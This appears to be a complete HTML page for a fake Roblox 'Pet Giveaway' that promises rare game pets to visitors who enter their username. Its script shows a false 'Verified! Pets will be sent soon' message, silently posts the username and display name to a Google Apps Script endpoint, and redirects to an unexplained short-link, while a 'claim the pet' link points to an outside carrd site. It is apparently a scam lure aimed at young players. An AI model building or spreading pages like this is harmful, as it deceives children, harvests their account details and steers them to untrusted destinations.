<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Pet Giveaway</title>

  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap" rel="stylesheet">

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:title" content="üéÅ Pet Giveaway">
  <meta property="og:description" content="Choose your pet and join our Roblox giveaway!">
  <meta property="og:image" content="https://i.ytimg.com/vi/fGWSgo6WnCc/hq720.jpg?v=6893deb8">
  <meta property="og:url" content="https://your-vercel-site.vercel.app">
  <meta name="twitter:card" content="summary_large_image">

  <style>
    body {
      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZQ5GG1BDHG80jzNDJRWhN7EWOnc--hk5MYQFk3tC1ybEurpbMmowfWWg&s=10') no-repeat center center fixed;
      background-size: cover;
      font-family: Arial, sans-serif;
      color: white;
      text-align: center;
      padding: 10px;
      margin: 0;
    }

    .container {
      background-color: rgba(0, 0, 0, 0.8);
      border-radius: 12px;
      padding: 15px;
      max-width: 350px;
      width: 100%;
      margin: 20px auto;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.5);
    }

    .pets {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
    }

    .pet {
      border: 2px solid transparent;
      border-radius: 8px;
      padding: 4px;
      cursor: pointer;
      transition: 0.2s;
    }

    .pet:hover {
      border-color: #fff;
      transform: scale(1.04);
    }

    .selected {
      border-color: #00ffcc !important;
    }

    .pet img {
      width: 80px;
      height: 80px;
      border-radius: 6px;
    }

    input, button {
      padding: 8px;
      margin-top: 8px;
      font-size: 15px;
      border-radius: 6px;
      border: none;
      width: 100%;
      box-sizing: border-box;
    }

    button {
      background-color: #00b894;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #019875;
    }

    #avatar {
      margin-top: 12px;
    }

    #confirmation {
      display: none;
      margin-top: 15px;
      padding: 12px;
      background-color: #28a745;
      border-radius: 8px;
      color: white;
      font-family: 'Poppins', sans-serif;
      font-size: 16px;
      font-weight: 600;
    }

    a {
      color: #00ffff;
      text-decoration: underline;
    }

    @media (max-width: 400px) {
      .pet img {
        width: 70px;
        height: 70px;
      }

      h1, h3, p {
        font-size: 16px;
      }

      input, button {
        font-size: 14px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üéÅ Pet Giveaway</h1>
    <p>Click link to claim the petü¶ù‚Üí <a href="https://growagardenserver.carrd.co" target="_blank">growagardenserver.carrd.co</a></p>

    <h3>Choose Your Pet</h3>
    <div class="pets" id="petList">
      <div class="pet" data-name="Raccoon">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDpb6oYHh0OnNavALI-aLfRiHUO3vM6heMQQ&s" alt="Raccoon"><br>Raccoon
      </div>
      <div class="pet" data-name="Kitsune">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVzQ1aBn_CVNcn0LM2lUpA5fMa-CjMucl7eg&s" alt="Kitsune"><br>Kitsune
      </div>
      <div class="pet" data-name="Disco Bee">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5hxIq8A9X1oLZ87I4pH0QOwYFLAbxnB85PA&s" alt="Disco Bee"><br>Disco Bee
      </div>
      <div class="pet" data-name="Butterfly">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWhyGKkPY82zZSmTyMUv2lTV0MYzKnD5Bvb0-FaM5_Tw&s" alt="Butterfly"><br>Butterfly
      </div>
    </div>

    <h3>Enter Your Roblox Username</h3>
    <input type="text" id="username" placeholder="Roblox Username" />
    <button onclick="verifyUser()">Enter Giveaway</button>

    <div id="avatar"></div>
    <div id="confirmation">‚úÖ Verified! You've entered the giveaway. Pets will be sent soon.</div>
  </div>

  <script>
    let selectedPet = null;

    document.querySelectorAll(".pet").forEach(pet => {
      pet.addEventListener("click", () => {
        document.querySelectorAll(".pet").forEach(p => p.classList.remove("selected"));
        pet.classList.add("selected");
        selectedPet = pet.dataset.name;
      });
    });

    async function verifyUser() {
      const username = document.getElementById("username").value.trim();
      if (!username) {
        alert("Please enter a username.");
        return;
      }
      if (!selectedPet) {
        alert("Please select a pet.");
        return;
      }

      const avatarDiv = document.getElementById("avatar");
      avatarDiv.innerHTML = "Loading avatar...";

      try {
        const res = await fetch("https://users.roblox.com/v1/usernames/users", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ usernames: [username] })
        });

        const data = await res.json();

        if (!data.data || !data.data[0]) {
          avatarDiv.innerHTML = "‚ùå User not found.";
        } else {
          const userId = data.data[0].id;
          const displayName = data.data[0].displayName;
          const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;

          avatarDiv.innerHTML = `
            <img src="${avatarUrl}" alt="Avatar" style="border-radius: 50%; width: 80px;"><br>
            <strong>${displayName}</strong> (@${username})<br>
            üéÅ Selected Pet: <strong>${selectedPet}</strong>
          `;

          document.getElementById("confirmation").style.display = "block";

          await fetch("https://script.google.com/macros/s/AKfycbwtTi9s4D6Y4aOoUqBQGbi7CgWGEW5VPVc04UslLQ5sMCUXeu0NpeAciRMPWZKbtDLy/exec", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              username: username,
              displayName: displayName,
              selectedPet: selectedPet
            })
          });
        }
      } catch (err) {
        console.error(err);
        avatarDiv.innerHTML = "‚úÖ You have entered the giveaway Redirecting you to serverüéÅ.";
      }

      // Redirect after 1 second
      setTimeout(() => {
        window.location.href = "https://short-link.me/15ZkG";
      }, 1000);
    }
  </script>
</body>
</html>
